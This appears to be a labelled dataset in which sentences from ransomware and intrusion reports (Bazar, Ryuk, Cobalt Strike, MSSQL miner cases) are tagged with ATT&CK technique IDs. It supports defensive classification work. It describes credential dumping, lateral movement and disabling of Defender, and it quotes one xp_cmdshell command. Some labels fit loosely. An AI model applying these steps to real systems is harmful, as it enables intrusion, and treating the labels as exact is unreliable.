    "text": "Prior to using the PowerShell beacon the threat actor dropped a DLL beacon on the server (p227.dll), but this appears to have failed for unknown reasons after which, the threat actor moved on to the PowerShell beacon which executed successfully.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After the initial execution of the IcedID malware, it established persistence by creating a copy of the malware (Ulfefi32.dll) in the AppData directory of the affected user and created a scheduled task to execute it every hour.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The task \\kajeavmeva_{B8C1A6A8-541E-8280-8C9A-74DF5295B61A} was created with the execution action below:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Process injection was observed during the intrusion by both IcedID and Cobalt Strike.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "On one system, the threat actor injected into the winlogon process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Volatility Malfind output shows the embedded MZ header in the winlogon process with the setting PAGE_EXECUTE_READWRITE protection settings on the memory space, a commonly observed attribute of process injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Network connections to the Cobalt Strike server by winlogon were also observed in the process logs.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Suspicious accesses to LSASS process memory were observed during this intrusion.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "As illustrated below, those accesses have been made using both Windows Task Manager and rundll32.exe which is assessed to be a Cobalt Strike temporary beacon (as shown in the Execution graph):",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors managed to steal administrator account credentials, allowing them to move laterally across the Active Directory domain.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "As mentioned in the Execution section, the IcedID process ran several initial discovery commands that provided environmental information about the host, network, and domain, to the threat actor.",
    "command": "",
    "labels": [
      "T1016",
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "A cmd.exe process spawned from IcedID which ran additional discovery queries.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor dropped the following files in C:\\Windows\\Temp directory: 7.exe (7zip), adfind.exe (AdFind), adfind.bat (pictured below)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After that, an additional batch script was created, ns.bat, which enumerated all host names in the domain with nslookup to identify the IP address of the host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Prior to the first lateral movement from the beachhead host, the threat actor tested credentials and gathered information from their targeted remote server using WMI",
    "command": "",
    "labels": [
      "T1003.001",
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used RDP to move laterally to critical hosts.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In particular, we have evidence on multiple machines of RDP using the Administrator account.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The attacker in this intrusion initiated RDP connections from a workstation, named TERZITERZI.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The RDP connections were established from the Cobalt Strike process running the beacon indicating the threat actor utilizing proxy on the beachhead host to facilitate the RDP traffic.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Through-out the intrusion the threat actor was also observed using WMIC to perform lateral activities including discovery actions remotely, and as a second option, to ensure all the remote hosts successfully executed the final ransomware payload.",
    "command": "",
    "labels": [
      "T1016",
      "T1047",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The WMIC commands prefaced with /node:IP Address allowed the threat actor to run commands on remote hosts.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "As we saw from the execution section, dar.dll was used to contact the below domains: dilimoretast[.]com, 138[.]68.42.130:443",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "With their pivot point from one of the domain controllers, the actor used a combination of both PsExec and WMI to remotely execute the ransomware.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "They first copied the payload, ttsel.exe, to the C$ share of each host on the network.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This resulted in the file C:\\Windows\\mstdc.exe being created on the target endpoint when PsExec was executed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The alternate execution method the actor employed was a WMI call to start a remote process on the target host.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Here’s another example of threat actors brute forcing RDP to install ransomware, this time the brute forced system was not using the default RDP port.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "They used tools such as Cobalt Strike, AdFind, WMI, and PowerShell to accomplish their objective.",
    "command": "",
    "labels": [
      "T1016",
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Bazar, once running, was seen again injecting into explorer.exe, svchost.exe, and spawning command shell processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "From this loader we saw initial mapping of the domain, using built-in windows utilities such as Nltest.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Lateral movement was initiated via SMB file transfers and WMI executions of Cobalt Strike Beacons.",
    "command": "",
    "labels": [
      "T1047",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Both portable executable and DLL beacons were used.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After moving laterally to the secondary domain controller, the threat actor started on more domain discovery via Net and the PowerShell Active Directory module.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "At this point, the threat actors used RDP to connect from the secondary domain controller, to the first domain controller, using the built in Administrator account.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Once on the main domain controller, another Cobalt Strike beacon was dropped and executed.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Four hours and 10 minutes in, the threat actors used the pivot from the primary domain controller to RDP into the Backup server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Backup servers were again targeted first for deployment of the ransomware executable, followed by servers and then workstations.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Bazar relies on user execution of an executable to run.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After resetting the password, the threat actors then targeted a different domain controller, potentially due to breaking services by use of their exploit.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On one of the domain controllers we saw use of the Cobalt Strike named pipe escalation.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "On the first domain controller that the threat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Dropped via RDP and executed via rundll32 on the second domain controller.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after, the DLL was called again via regsrv32.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Then a 2nd DLL was dropped and executed in a similar manner on the 2nd DC.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The first lateral movement occurred to the domain controller not affected by the use of CVE-2020-1472.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "An executable was transferred to it via SMB using a domain administrator account.",
    "command": "",
    "labels": [
      "T1078",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The presence of the EICAR strings point to the Cobalt Strike software being used as a trial version.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Shortly there after we saw a Cobalt Strike DLL transferred via the RDP connection.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RDP was used to pivot from the main domain controller and distribute the final ransomware payload enterprise wide.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Starting around 4.5 hours after the initial Bazar malware was executed, the Ryuk threat actors acted on their final objectives and initiated RDP connections from the domain controller previously exploited, to the rest of the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This time they initiated the ransomware first on the secondary domain controller (their 1st pivot) and transferred the Ryuk executable over the RDP connection.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Like in our prior two reports of Ryuk campaigns, the initial access came from phishing emails containing links to google drive that when clicked, downloaded a Bazar Loader backdoor executable.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "In this case, the time from initial Bazar execution to domain recon was 5 minutes, and deployment of Cobalt Strike beacons was within 10 minutes.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In this case, we saw them deploy persistence on the beachhead host, an action we had not previously seen in our other cases.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "After establishing another C2 for an additional Cobalt Strike beacon, they employed the Zerologon exploit (CVE 2020-1472) and obtained domain admin level privileges.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "We also saw host process injection on the beachhead used for obfuscation and privilege escalation.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "With domain administrator privileges obtained, the threat actors then moved laterally throughout the network using SMB and RDP to deploy Cobalt Strike beacons on the domain controllers around 1 hour after the initial execution of Bazar.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "From there, they targeted other severs in the environment; specifically, back up systems, file servers, and software deployment servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After establishing Cobalt Strike beacons on those they felt ready to proceed to their final objectives.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "At the 2 hour mark the threat actors made the move to deploy Ryuk ransomware by establishing RDP connections from the domain controllers to servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Execution of the initial Bazar Loader malware relies on user interaction.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This time, unlike prior investigations, clear persistence was found setup on the beachhead host.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Firefox.exe created these scheduled tasks as well as the run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The Zerologon vulnerability CVE 2020-1472 was again exploited to obtain domain admin level privileges.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Process injection was used on the beachhead host to to inject into svchost.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Seven minutes later, after launching a Cobalt Strike beacon, AdFind was used– running the same discovery pattern seen in previous reporting.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This was started via a bat script.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It appears that the threat actors are now piping these commands into a batch file one at a time instead of dropping adf.bat to disk.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "RDP connections were initiated from Cobalt Strike Beacons running on the beachhead host to two domain controllers and then Cobalt Strike executables were dropped by these connections.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition to using RDP to move around the environment execuatables were also transferred over SMB to ADMIN$ shares and executed as a service.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "RDP connections were initiated from one of the domain controllers and the Ryuk executables were deployed and executed over these RDP connections.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They used tools such as Cobalt Strike, AdFind, WMI, vsftpd, PowerShell, PowerView, and Rubeus to accomplish their objective.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes.",
    "command": "",
    "labels": [
      "T1055",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It took a few attempts, using various methods, from remote WMI, to remote service execution with PowerShell, until finally landing on Cobalt Strike beacon executable files transferred over SMB to move around the environment.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "From here forward, the threat actors relied on a Cobalt Strike beacon running on a domain controller as their main operations point.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After picking the most reliable method to move through the environment, the threat actor then proceeded to establish beacons across the enterprise.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In preparation for their final objectives, they used PowerShell to disable Windows Defender in the environment.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "At this point Ryuk was transferred to the rest of the hosts in the environment via SMB and executed through an RDP connection from the pivot domain controller.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "We downloaded and ran Document-Preview.exe, which connected to 5.182.210[.]145 over 443/https.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "WMI was used as well in an attempt to execute dlls laterally.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors also performed process injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "AdFind and adf.bat were dropped and run minutes after Document-Preview.exe was executed.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "WMI was used to check for the current AntiVirus on numerous systems",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "From there, the threat actor used WMIC to execute the beacon.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Following this, the treat actors copied and executed a Cobalt Strike beacon executable and initiated it via a service on the domain controller.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "At this point, C2 connections appear on the domain controller connecting to martahzz[.]com – 88.119.171[.]75 over 443/https.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Then, RDP connections were made from the first compromised DC, and then, ransomware executed throughout the environment, starting with the Backup servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In the past year or so, we have observed malware variants such as IcedId and Trickbot being embedded into macro-based Office documents and delivered as email attachments.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "In majority of those intrusions, the Office (Excel or Word) document spawns suspicious processes such as Living-of-the-land binaries (regsvr32.exe, rundll32.exe) and Windows Command Line shell (cmd.exe, powershell.exe).",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "After establishing the initial foothold, threat actors deploy multiple techniques to maintain access to the victim environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "As highlighted in “2021 Year in Review”, scheduled tasks were deployed by threat actors in more than 50% of the intrusions.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "In our “Diavol Ransomware” case, a new BITS job was created to execute the malicious DLL from mounted ISO image every 3 hours.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "These shells were later used for performing discovery activity.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "As this is a remote service, there will be a mix of process and network activity that should be very visible.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Both process and network events will be detected:",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "After escalation of privileges, threat actors target the LSASS process.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Accessing the LSASS process using CS or initial malware:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors also commonly dump the LSASS process with the help of utilities such as Procdump and Task Manager.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Most common being disabling of Windows Defender AV.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Microsoft Defender critical security components disabled (command)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Microsoft Defender critical security components disabled (PowerShell)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows Defender Threat Detection Disabled",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors rely on Windows built-in utilities for performing initial discovery activity.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "To achieve their objectives, the threat actors pivot to multiple systems such as Domain Controllers, Backup Servers and File Shares using various tools/techniques:",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In the past, we have seen Ransomware operators upload the LSASS dump file to ufile.io.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "We have two Sigma detection rules that detect Cobalt Strike operator errors, where Cobalt Strike specific commands or modules are inadvertently entered directly on the host via the shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Both Sigma rules are based on popular Cobalt Strike commands or have observed operators utilizing in various cases.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "If an operator entered commands, and this was captured on the endpoint via Sysmon for example, it would be possible to detect this action.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "For example, if the operator entered ‘av_query’, (we have observed such mistakes in past cases), using the Sigma rule, we could observe the following output.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In various intrusions we observe operators deploying custom tooling directly from endpoints or staging files locally.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Sometimes we see the same filenames for scripts, or very specific command-line parameters being utilized across cases.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The following Sigma rule detects several .BAT files we have observed being executed.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "As mentioned in our previous report, following good practices such as hardening, maintaining software updates and provision of an anti-virus solution should stop initial access and establish foothold stages from materializing.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In March 2022, we observed an intrusion on a public-facing Microsoft SQL Server.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Over the month of March, we observed a cluster of activity targeting MSSQL servers.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After having the correct credentials in their possession, the attackers then spawned a command shell via xp_cmdshell.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "According to Microsoft documentation, xp_cmdshell spawns a Windows command shell and passes in a string for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Using xp_cmdshell, the threat actors were able to execute any command against the compromised server.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "They attempted to kill a bunch of AV programs by using taskkill.exe.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "After they finished writing to that file, they ran certutil to decode the base64 data into an executable file.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "They then executed the batch script.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Once the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "They dropped a Binary Managed Object Format (BMOF) file along with the miner itself, to do that.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used mofcomp.exe to decompile the BMOF binary and register a malicious class in the WMI repository.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "In the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (xp_cmdshell).",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "An example of command execution following a successful authentication to SQL database using xp_cmdshell:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "#Executing 'whoami' command on the remote host",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "EXEC xp_cmdshell ‘whoami’",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "They used xp_cmdshell to write a batch script (1.bat) to disk by redirecting strings to the file using echo commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Mofcomp.exe is also used to execute scripts by parsing the MOF statements and creates new classes as part of the WMI repository.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Using the same mofcomp utility, its possible to decompile the BMOF to extract the script, using this command provided by Matt Graeber:",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors transferred the file ex.exe.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The kit.bat script included instructions for executing the miner as well as for creating persistence via a schedule task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "They also made remote RDP connections possible by changing the fDenyTSConnections and UserAuthentication values to 0.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "We later see the threat actors writing another batch file to disk and executing it.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The kit.bat script contained a scheduled task that would run the kit.bat script on an hourly basis.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "As explained in the execution tactic above, the threat actors installed a malicious WMI event subscription by including a VBScript that would execute on the compromised host.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "This was used as a method of persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Decompiled .mof file containing the WMI event subscription.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Breaking down the above screenshot, the WMI event subscription contains the below malicious EventConsumer and EventFilter classes:",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Looking into the VBScript, we notice that it is reaching out to the domain mymst007[.]info on port 4000 to download one more file and save it as temp file.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WMI EventConsumer VBScript:",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "We used the below python code to emulate the VBScript and download the next stage payload:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Second stage payload downloaded and executed:",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The final method of persistence we observed was the addition of an entry into the Image File Execution Option (IFEO) registry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "By changing the Debugger value to a different executable, an attacker used IFEO to launch a program other than the intended one.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors dropped a file named bigfile.txt which they used certutil to convert to bigfile.exe which we believe is a variation of NetworkServiceExploit.exe as seen below.",
    "command": "",
    "labels": [
      "T1105",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors attempted to kill antivirus tasks that could be running on the host.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The privilege escalation tool the threat actors brought with them was written as a text file and then decoded using certutil into a binary file.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "As we can see from the contents of the 1.bat script, the threat actors are adding a new local administrator user and they proceed with hiding the user account by adding it to the registry using “Special Accounts“.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "We observed that the domain mymst007[.]info is used to download further payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Connections related to the domain – mymst007[.]info",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "When the user searches for these phrases and clicks on one of the top results, they are left with a forum looking web page where the user is instructed to download a file, which they accidently execute (double click to open).",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section).",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1055",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Meanwhile on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "With those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Our evidence shows that the attackers then began looking for interesting documents on file shares.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "They opened the documents one-by-one on the remote host via RDP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session.",
    "command": "",
    "labels": [
      "T1016",
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.",
    "command": "",
    "labels": [
      "T1074.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The Javascript file is then executed when double clicked after the zip is opened.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
